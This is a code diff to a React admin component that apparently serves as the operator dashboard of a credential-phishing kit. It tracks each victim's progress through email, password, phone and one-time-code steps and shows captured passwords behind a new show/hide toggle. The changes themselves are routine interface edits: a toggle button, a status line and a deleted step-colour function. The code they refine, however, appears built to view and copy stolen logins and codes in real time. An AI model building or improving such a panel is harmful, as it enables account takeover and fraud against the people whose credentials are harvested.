@@ -16,6 +16,7 @@ function Admin() {
   const [showApproveModal, setShowApproveModal] = useState(false);
   const [soundEnabled, setSoundEnabled] = useState(true);
   const [copiedField, setCopiedField] = useState(null);
+  const [expandedUsers, setExpandedUsers] = useState({});
 
 const [selectedUser, setSelectedUser] = useState(null);
 
@@ -139,6 +140,12 @@ useEffect(() => {
   );
 };
 
+const toggleUserInfo = (userId) => {
+  setExpandedUsers((prev) => ({
+    ...prev,
+    [userId]: !prev[userId]
+  }));
+};
 
 const copyField = async (field, value) => {
   if (!value) return;
@@ -769,25 +776,32 @@ const handlePhoneOtp2Submitted = (data) => {
                     : user.email || "Not submitted"}
                   </div>
 
-                  <div style={styles.id}>
-                    ID: {user._id}
-                  </div>
+                  <p style={styles.id}>
+                    Current Status: {user.status}
+                  </p>
 
                 </div>
 
 
-                <div
-                  style={{
-                    ...styles.stepBadge,
-                    background:
-                      getStepColor(
-                        user.currentStep
-                      )
-                  }}
-                >
-                  {user.currentStep ||
-                    "email"}
-                </div>
+              <button
+                onClick={() => toggleUserInfo(user._id)}
+                style={{
+                  width: "80px",
+                  border: "1px solid #191b1f",
+                  background: "#465380",
+                  color: "#fbfbfc",
+                  padding: "10px",
+                  borderRadius: "6px",
+                  fontSize: "14px",
+                  fontWeight: "500",
+                  cursor: "pointer",
+                  marginBottom: "12px"
+                }}
+              >
+                {expandedUsers[user._id]
+                  ? "▲ Hide "
+                  : "▼ Show "}
+              </button>
 
               </div>
 
@@ -795,8 +809,8 @@ const handlePhoneOtp2Submitted = (data) => {
               {/* ======================
                   STATUS
               ======================= */}
-
-                <div style={styles.info}>
+              {expandedUsers[user._id] && (
+                                <div style={styles.info}>
 
   {/* Password - don't expose/copy sensitive credentials */}
   <p    onClick={() =>
@@ -968,6 +982,10 @@ const handlePhoneOtp2Submitted = (data) => {
   </p>
 
 </div>
+
+              )}
+
+
 
 
 
@@ -1214,31 +1232,6 @@ theme="light"
 // STEP COLOR
 // ======================================
 
-function getStepColor(step) {
-
-  switch (step) {
-
-    case "password":
-      return "#e8f0fe";
-
-    case "phone":
-      return "#fef7e0";
-
-    case "signin-request":
-      return "#f3e8fd";
-
-    case "wrong-password":
-      return "#fce8e6";
-
-    case "success":
-      return "#e6f4ea";
-
-    default:
-      return "#f1f3f4";
-
-  }
-
-}
 
 
 // ======================================
